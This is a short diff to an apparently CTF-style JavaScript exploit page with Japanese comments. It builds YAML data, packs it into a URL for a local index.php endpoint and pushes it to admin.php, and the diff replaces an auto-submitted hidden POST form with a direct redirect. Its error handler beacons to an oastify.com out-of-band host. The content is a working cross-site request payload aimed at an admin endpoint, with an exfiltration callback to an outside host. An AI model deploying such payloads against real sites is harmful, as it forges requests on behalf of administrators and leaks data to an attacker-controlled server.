@@ -1,5 +1,5 @@
 <script>
-    (async () => {
+(async () => {
     try {
       // YAMLデータを作成
       const yaml = `- {amount: 1, currency: JP, op: BUY}
@@ -9,20 +9,8 @@
       // YAMLを返すエンドポイントURL
       const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
 
-      // POSTリクエストを送信するフォームを動的に作成
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'http://localhost:5000/admin.php';
-      form.target = '_self';
-
-      const input = document.createElement('input');
-      input.type = 'hidden';
-      input.name = 'url';
-      input.value = yamlUrl;
-
-      form.appendChild(input);
-      document.body.appendChild(form);
-      form.submit();
+      // 直接admin.phpにリダイレクト（POSTパラメータをGETで送信）
+      window.location.href = "http://localhost:5000/admin.php?url=" + encodeURIComponent(yamlUrl);
 
     } catch (e) {
       new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
